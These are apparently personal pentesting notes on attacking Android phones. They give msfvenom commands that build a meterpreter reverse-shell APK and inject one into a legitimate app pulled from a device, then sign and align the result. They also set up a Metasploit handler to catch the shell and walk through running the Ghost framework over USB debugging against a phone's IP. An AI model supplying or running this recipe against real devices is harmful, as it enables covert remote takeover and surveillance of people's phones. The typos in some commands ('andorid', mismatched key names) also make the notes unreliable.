
# HAK5 shop
One of the most shop for hacking is [https://shop.hak5.org/](https://shop.hak5.org/)

Here we can find a lot of tools to perform pentesting, like cables that can execute malicious attack such as keylogging.



# Create generic APK with using metasploit shell


We can easily create a generic APK that executes a shell using:
```shell
msfvenom -p andorid/meterpreter/reverse_tcp LHOST=OUR_IP_ADDRESS LPORT = OUR_PORT R > malicious_file.apk
```


At this point we need to sign it:
```shell
keytool -genkey -v -keystore custom.keystore -alias alias_we_want -keyalg RSA -keysize 2048 -validity 10000
```
- add random info when required

```shell
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore our_key.key -storepass password_we_want file.apk alias_of_our_key
```

```shell
zipalign 4 file.apk final_file.apk
```



At this point we need to open a shell on our host.


# inject a shell in an playstore app


In some cases we need to remove `apktool` and reinstall it from `ibotpeaches` [https://apktool.org/docs/install/](https://apktool.org/docs/install/)

At this point we need to pull the apk of the app we want to inject:
```shell
adb shell
```
```shell
pm list packages | grep package_name_we_want 
```
```shell
pm path package_name_we_want
```
```shell
adb pull path_found
```



At this point we can execute:
```shell
msfvenom -x pulled.apk -p andorid/meterpreter/reverse_tcp LHOST=OUR_IP_ADDRESS LPORT = OUR_PORT -o malicious_file.apk
```


At this point we install it.

We open a shell on our host:
```shell
msfconsole

search exploit/multi/handler

use number_of_handler

set LHOST our_IP
set LPORT our_port

run
```


# Ghost framework
First of all we need to put the device in a developer mode:
`Settings`->`About device` ->`click several times on build number` 

Then we need to enable usb debugging:
`Developer options` -> `USB debugging`


Now we can download ghost framework :
```shell
git clone https://github.com/EntySec/Ghost 
```

To install it we cna use 
```shell
sudo ./install.sh
```

To run it we need to execute 
```shell
./ghost
```
- on the folder

At this point we can use it.

We need to set the target phone IP:
```shell
set RHOST PHONE_IP
```

And run it:
```shell
run
```

At this point we can execute the scripts we want to use.


